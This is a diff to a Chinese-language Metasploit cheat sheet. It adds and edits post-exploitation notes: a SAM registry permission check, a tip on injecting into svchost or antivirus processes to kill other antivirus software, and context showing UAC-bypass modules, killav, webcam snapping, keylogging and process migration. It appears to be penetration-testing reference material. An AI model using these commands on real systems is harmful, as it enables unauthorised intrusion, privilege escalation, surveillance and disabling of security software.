@@ -24,6 +24,7 @@
 - [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
 - [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)
 - [探寻Metasploit Payload模式背后的秘密](https://www.freebuf.com/articles/system/187312.html)
+- [记一次PowerShell配合Metersploit的艰难提权](https://mp.weixin.qq.com/s/Y4rT3ECaSLNgr8KrG-xtTw)
 
 **图形化 UI**
 - [FunnyWolf/Viper](https://github.com/FunnyWolf/Viper) - 非常牛逼,推荐
@@ -232,6 +233,14 @@ exploit -j  # 后台执行
 
 ## 信息收集
 
+**查看权限**
+```bash
+getuid          # 查看当前用户
+load powershell
+powershell_shell
+PS > Get-Acl -Path HKLM:\SAM\SAM | Format-List          # 查看 Users 或 Everyone 是否有 SAM 注册表项的读取权限
+```
+
 **截屏**
 ```bash
 use espia
@@ -248,8 +257,6 @@ webcam_snap -i 1 -v fales                               # 不开闪光灯拍照
 ```bash
 run post/windows/gather/checkvm                         # 是否虚拟机
 run post/linux/gather/checkvm                           # 是否虚拟机
-
-getuid                                                  # 查看当前用户
 
 run post/windows/gather/enum_applications               # 获取目标主机安装软件信息;
 run post/windows/gather/enum_patches                    # 查看目标主机的补丁信息;
@@ -354,7 +361,7 @@ set session     # 设为你需要 exploit 的 session
 
 - **通过 COM 处理程序劫持**
 
-    首先介绍一下这个 COM 处理程序劫持,此模块将通过在 hkcu 配置单元中创建 COM 处理程序注册表项来绕过 Windows UAC.当加载某些较高完整性级别进程时,会引用这些注册表项,从而导致进程加载用户控制的 DLL.这些 DLL 包含导致会话权限提升的 payload.此模块修改注册表项,但在调用 payload 后将清除该项.这个模块需要 payload 的体系架构和操作系统匹配,但是当前的低权限 meterpreter 会话体系架构中可能不同.如果指定 exe::custom,则应在单独的进程中启动 payload 后调用 ExitProcess().此模块通过目标上的 cmd.exe 调用目标二进制文件.因此,如果 cmd.exe 访问受到限制,此模块将无法正常运行.
+    此模块将通过在 hkcu 配置单元中创建 COM 处理程序注册表项来绕过 Windows UAC.当加载某些较高完整性级别进程时,会引用这些注册表项,从而导致进程加载用户控制的 DLL.这些 DLL 包含导致会话权限提升的 payload.此模块修改注册表项,但在调用 payload 后将清除该项.这个模块需要 payload 的体系架构和操作系统匹配,但是当前的低权限 meterpreter 会话体系架构中可能不同.如果指定 exe::custom,则应在单独的进程中启动 payload 后调用 ExitProcess().此模块通过目标上的 cmd.exe 调用目标二进制文件.因此,如果 cmd.exe 访问受到限制,此模块将无法正常运行.
     ```
     background
     use exploit/windows/local/bypassuac_comhijack
@@ -364,7 +371,7 @@ set session     # 设为你需要 exploit 的 session
 
 - **通过 Eventvwr 注册表项**
 
-    首先介绍一下这个模块,此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动 Windows 事件查看器时调用的自定义命令来绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.此模块修改注册表项,但在调用 payload 后将清除该项.该模块不需要 payload 的体系架构和操作系统匹配.如果指定 EXE ::Custom,则应在单独的进程中启动 payload 后调用 ExitProcess().
+    此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动 Windows 事件查看器时调用的自定义命令来绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.此模块修改注册表项,但在调用 payload 后将清除该项.该模块不需要 payload 的体系架构和操作系统匹配.如果指定 EXE ::Custom,则应在单独的进程中启动 payload 后调用 ExitProcess().
     ```
     background
     use exploit/windows/local/bypassuac_eventvwr
@@ -546,6 +553,14 @@ SRVPORT:监听的端口,默认为 1080.
 run killav
 ```
 
+一个技巧是注入到 service.exe/svchost.exe 或 高权限杀软中 干掉 其他杀软
+
+**关闭进程**
+
+```bash
+pkill [进程名]
+```
+
 **键盘记录**
 
 ```bash
@@ -571,7 +586,7 @@ execute -f [path] [options] # 在目标主机上执行 exe 文件
 ```bash
 getpid          # 查看当前会话的进程 id
 ps              # 查看目标运行的进程
-migrate pid     # 绑定/迁移进程
+migrate [pid]   # 绑定/迁移进程
 ```
 
 **后门**
